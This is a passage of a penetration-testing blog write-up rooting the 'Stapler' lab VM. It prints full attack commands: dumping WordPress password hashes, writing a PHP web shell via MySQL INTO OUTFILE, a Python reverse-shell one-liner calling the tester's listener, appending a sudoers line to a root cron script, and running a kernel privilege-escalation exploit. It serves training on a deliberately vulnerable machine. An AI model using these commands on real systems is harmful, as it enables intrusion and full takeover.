<p>So this site uses the database and we have robots.txt entries. However, I kept getting redirected to the webpage when trying anything else. Then I realized that I haven&rsquo;t tried browsing the site over SSL, so I did that and found myself looking at a blank page with the text <code>Internal Index Page!</code>. This time I was able to look at robots.txt and visit the entries:</p>

<p><img class="center" src="/images/pentest/stapler/beef.jpg" title="admin" alt="admin"></p>

<p>Ok, a troll. The other entry proved more interesting, because it took me to a Wordpress blog:</p>

<p><img class="center" src="/images/pentest/stapler/initech.png" title="initech" alt="initech blog"></p>

<p>The blog entries mention new plugins and themes..and this being a Wordpress installation, it&rsquo;s time to bring wpscan on the scene!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --disable-tls-checks --url https://192.168.217.141:12380/blogblog/
</span><span class='line'>_______________________________________________________________
</span><span class='line'>        __          _______   _____                  
</span><span class='line'>        \ \        / /  __ \ / ____|                 
</span><span class='line'>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
</span><span class='line'>          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
</span><span class='line'>           \  /\  /  | |     ____) | (__| (_| | | | |
</span><span class='line'>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span><span class='line'>
</span><span class='line'>        WordPress Security Scanner by the WPScan Team 
</span><span class='line'>                       Version 2.9.3
</span><span class='line'>          Sponsored by Sucuri - https://sucuri.net
</span><span class='line'>   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
</span><span class='line'>_______________________________________________________________
</span><span class='line'>
</span><span class='line'>[+] URL: https://192.168.217.141:12380/blogblog/
</span><span class='line'>[+] Started: Fri Jun  1 07:28:02 2018
</span><span class='line'>
</span><span class='line'>[!] The WordPress 'https://192.168.217.141:12380/blogblog/readme.html' file exists exposing a version number
</span><span class='line'>[+] Interesting header: DAVE: Soemthing doesn't look right here
</span><span class='line'>[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
</span><span class='line'>[!] Registration is enabled: https://192.168.217.141:12380/blogblog/wp-login.php?action=register
</span><span class='line'>[+] XML-RPC Interface available under: https://192.168.217.141:12380/blogblog/xmlrpc.php
</span><span class='line'>[!] Upload directory has directory listing enabled: https://192.168.217.141:12380/blogblog/wp-content/uploads/
</span><span class='line'>[!] Includes directory has directory listing enabled: https://192.168.217.141:12380/blogblog/wp-includes/
</span><span class='line'>
</span><span class='line'>[+] WordPress version 4.2.1 (Released on 2015-04-27) identified from readme, links opml, stylesheets numbers, advanced fingerprinting, meta generator
</span><span class='line'>[!] 54 vulnerabilities identified from the version number</span></code></pre></td></tr></table></div></figure>


<p>Lots of XSS and other vulnerabilities, but I didn&rsquo;t notice something that I could use immediately, like an arbitrary file upload or code execution. I went ahead and enumerated the users:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --disable-tls-checks --url https://192.168.217.141:12380/blogblog/ --enumerate u
</span><span class='line'>[+] Enumerating usernames ...
</span><span class='line'>[+] Identified the following 10 user/s:
</span><span class='line'>    +----+---------+-----------------+
</span><span class='line'>    | Id | Login   | Name            |
</span><span class='line'>    +----+---------+-----------------+
</span><span class='line'>    | 1  | john    | John Smith      |
</span><span class='line'>    | 2  | elly    | Elly Jones      |
</span><span class='line'>    | 3  | peter   | Peter Parker    |
</span><span class='line'>    | 4  | barry   | Barry Atkins    |
</span><span class='line'>    | 5  | heather | Heather Neville |
</span><span class='line'>    | 6  | garry   | garry           |
</span><span class='line'>    | 7  | harry   | harry           |
</span><span class='line'>    | 8  | scott   | scott           |
</span><span class='line'>    | 9  | kathy   | kathy           |
</span><span class='line'>    | 10 | tim     | tim             |
</span><span class='line'>    +----+---------+-----------------+</span></code></pre></td></tr></table></div></figure>


<p>Next I enumerated all the plugins in the hope of finding an exploitable vulnerability:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --disable-tls-checks --url https://192.168.217.141:12380/blogblog/ --enumerate ap
</span><span class='line'>[+] Enumerating all plugins (may take a while and use a lot of system resources) ...
</span><span class='line'>
</span><span class='line'>   Time: 00:04:40 &lt;=====================&gt; (74652 / 74652) 100.00% Time: 00:04:40
</span><span class='line'>
</span><span class='line'>[+] We found 4 plugins:
</span><span class='line'>
</span><span class='line'>[+] Name: advanced-video-embed-embed-videos-or-playlists - v1.0
</span><span class='line'> |  Latest version: 1.0 (up to date)
</span><span class='line'> |  Last updated: 2015-10-14T13:52:00.000Z
</span><span class='line'> |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
</span><span class='line'> |  Readme: https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
</span><span class='line'>[!] Directory listing is enabled: https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
</span><span class='line'>
</span><span class='line'>[+] Name: akismet
</span><span class='line'> |  Latest version: 4.0.7 
</span><span class='line'> |  Last updated: 2018-05-28T16:19:00.000Z
</span><span class='line'> |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/akismet/
</span><span class='line'>
</span><span class='line'>[!] We could not determine a version so all vulnerabilities are printed out
</span><span class='line'>
</span><span class='line'>[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
</span><span class='line'>    Reference: https://wpvulndb.com/vulnerabilities/8215
</span><span class='line'>    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
</span><span class='line'>    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
</span><span class='line'>[i] Fixed in: 3.1.5
</span><span class='line'>
</span><span class='line'>[+] Name: shortcode-ui - v0.6.2
</span><span class='line'> |  Last updated: 2017-09-12T20:55:00.000Z
</span><span class='line'> |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/
</span><span class='line'> |  Readme: https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
</span><span class='line'>[!] The version is out of date, the latest version is 0.7.3
</span><span class='line'>[!] Directory listing is enabled: https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/
</span><span class='line'>
</span><span class='line'>[+] Name: two-factor
</span><span class='line'> |  Latest version: 0.1-dev-20180225 
</span><span class='line'> |  Last updated: 2018-02-25T10:55:00.000Z
</span><span class='line'> |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/
</span><span class='line'> |  Readme: https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/readme.txt
</span><span class='line'>[!] Directory listing is enabled: https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/</span></code></pre></td></tr></table></div></figure>


<p>Still not much. The expected way is to upload a reverse shell, but I didn&rsquo;t have credentials for the WP users and I tried bruteforcing but it was very slow. I remembered that I have the MySQL credentials from earlier:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# mysql -u root -h 192.168.217.141 wordpress -p
</span><span class='line'>Enter password: 
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Welcome to the MariaDB monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 21183
</span><span class='line'>Server version: 5.7.12-0ubuntu1 (Ubuntu)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>MySQL [wordpress]&gt; </span></code></pre></td></tr></table></div></figure>


<p>I logged in to the DB and grabbed the password hashes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>MySQL [wordpress]&gt; show tables;
</span><span class='line'>+-----------------------+
</span><span class='line'>| Tables_in_wordpress   |
</span><span class='line'>+-----------------------+
</span><span class='line'>| wp_commentmeta        |
</span><span class='line'>| wp_comments           |
</span><span class='line'>| wp_links              |
</span><span class='line'>| wp_options            |
</span><span class='line'>| wp_postmeta           |
</span><span class='line'>| wp_posts              |
</span><span class='line'>| wp_term_relationships |
</span><span class='line'>| wp_term_taxonomy      |
</span><span class='line'>| wp_terms              |
</span><span class='line'>| wp_usermeta           |
</span><span class='line'>| wp_users              |
</span><span class='line'>+-----------------------+
</span><span class='line'>
</span><span class='line'>MySQL [wordpress]&gt; SELECT user_login, user_pass FROM wp_users;
</span><span class='line'>+------------+------------------------------------+
</span><span class='line'>| user_login | user_pass                          |
</span><span class='line'>+------------+------------------------------------+
</span><span class='line'>| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
</span><span class='line'>| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
</span><span class='line'>| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
</span><span class='line'>| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
</span><span class='line'>| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
</span><span class='line'>| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
</span><span class='line'>| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
</span><span class='line'>| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
</span><span class='line'>| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
</span><span class='line'>| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
</span><span class='line'>| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
</span><span class='line'>| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
</span><span class='line'>| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
</span><span class='line'>| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
</span><span class='line'>| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
</span><span class='line'>| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
</span><span class='line'>+------------+------------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>I tried cracking them with john but it took so long so I aborted it. Instead, I leveraged the fact that MySQL was running as root to write a rudimentary shell on the filesystem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>MySQL [wordpress]&gt; Select "&lt;?php echo shell_exec($_GET['cmd']);?&gt;" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
</span><span class='line'>Query OK, 1 row affected (0.04 sec)</span></code></pre></td></tr></table></div></figure>


<p>I tested the shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>https://192.168.217.141:12380/blogblog/wp-content/uploads/shell.php?cmd=whoami
</span><span class='line'>www-data </span></code></pre></td></tr></table></div></figure>


<p>Then I used one of PentestMonkey&rsquo;s awesome one-liners to upgrade the shell, after setting up a listener:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>https://192.168.217.141:12380/blogblog/wp-content/uploads/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.217.132",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</span><span class='line'>
</span><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.141] 39846
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ python -c 'import pty;pty.spawn("/bin/bash")'
</span><span class='line'>www-data@red:/var/www/https/blogblog/wp-content/uploads$</span></code></pre></td></tr></table></div></figure>


<p>A bit convoluted and relying on the enumeration / access from previous attempts, but I got another low privileged shell. I proceeded to do more enumeration in order to find a different way of elevating privileges. One of the things I did was search for files owned by root and writeable by everyone:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>find / -type f -user root -perm /o=w 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p>I scrolled through the output until I found something interesting:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/local/sbin/cron-logrotate.sh
</span><span class='line'>www-data@red:/$ cat /usr/local/sbin/cron-logrotate.sh
</span><span class='line'>cat /usr/local/sbin/cron-logrotate.sh
</span><span class='line'>#Simon, you really need to-do something about this</span></code></pre></td></tr></table></div></figure>


<p>A cronjob run by root that we can write to! I added the following line that adds www-data to sudoers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo "echo 'www-data  ALL=NOPASSWD: ALL' &gt;&gt; /etc/sudoers" &gt;&gt; /usr/local/sbin/cron-logrotate.sh</span></code></pre></td></tr></table></div></figure>


<p>Waited a bit and then:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo su
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>


<p>Lastly, we can get root just by using an exploit. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_privcheck.py</a> against the kernel version:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python linux_privcheck.py 
</span><span class='line'>Kernel version is 4.4.0-21-generic
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: BPF Privilege Escalation
</span><span class='line'>CVE: CVE-2016-4557
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/39772/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: Netfilter target_offset Out-of-Bounds Privilege Escalation
</span><span class='line'>CVE: N/A
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/40049/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: AF_PACKET Race Condition Privilege Escalation
</span><span class='line'>CVE: CVE-2016-8655
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/40871/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: DCCP Double-Free Privilege Escalation
</span><span class='line'>CVE: CVE-2017-6074
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/41458/
</span><span class='line'>###########################################</span></code></pre></td></tr></table></div></figure>


<p>I used the first exploit, downloaded the files to my machine, and then uploaded them to the Stapler box by using the TFTP that I&rsquo;ve identified previously:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tftp 192.168.217.141
</span><span class='line'>tftp&gt; put compile.sh
</span><span class='line'>Sent 160 bytes in 0.1 seconds
</span><span class='line'>tftp&gt; put doubleput.c
</span><span class='line'>Sent 4330 bytes in 0.0 seconds
</span><span class='line'>tftp&gt; put hello.c
</span><span class='line'>Sent 2272 bytes in 0.1 seconds
</span><span class='line'>tftp&gt; put suidhelper.c
</span><span class='line'>Sent 267 bytes in 0.0 seconds</span></code></pre></td></tr></table></div></figure>


<p>On my shell, I looked around and saw that the files were uploaded to the <code>/home/www</code> directory. I copied them to /tmp, compiled and ran the exploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./compile.sh
</span><span class='line'>doubleput.c: In function 'make_setuid':
</span><span class='line'>doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
</span><span class='line'>    .insns = (__aligned_u64) insns,
</span><span class='line'>             ^
</span><span class='line'>doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
</span><span class='line'>    .license = (__aligned_u64)""
</span><span class='line'>
</span><span class='line'>$ ./doubleput
</span><span class='line'>starting writev
</span><span class='line'>woohoo, got pointer reuse
</span><span class='line'>writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
</span><span class='line'>suid file detected, launching rootshell...
</span><span class='line'>we have root privs now...
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></code></pre></td></tr></table></div></figure>


<p>Getting root, a 3rd time! Thanks g0tmi1k for an awesome boot2root!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Q: How does a hacker fix a function     \
</span><span class='line'>| which                                   |
</span><span class='line'>|                                         |
</span><span class='line'>| doesn't work for all of the elements in |
</span><span class='line'>\ its domain? A: He changes the domain.   /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2018-05-27T00:24:11+03:00" pubdate data-updated="true">May 27<span>th</span>, 2018</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2018/05/27/got-a-stapler/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2018/05/27/got-a-stapler/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2018/05/13/hacking-the-milnet/" title="Previous Post: Hacking the Milnet">&laquo; Hacking the Milnet</a>
      
      
        <a class="basic-alignment right" href="/blog/2018/06/09/destroy-the-necromancer/" title="Next Post: Destroy The Necromancer">Destroy The Necromancer &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2020/06/14/oscp-flash-review/">OSCP flash review</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/09/09/there-be-tr0lls-part-3/">There be Tr0lls - Part 3</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/06/09/no-mercy/">No Mercy</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/05/30/pond-analoguepond/">Pond. Analoguepond</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/05/19/derpnstink/">Derpnstink</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2020 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2018/05/27/got-a-stapler/';
        var disqus_url = 'http://chousensha.github.io/blog/2018/05/27/got-a-stapler/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
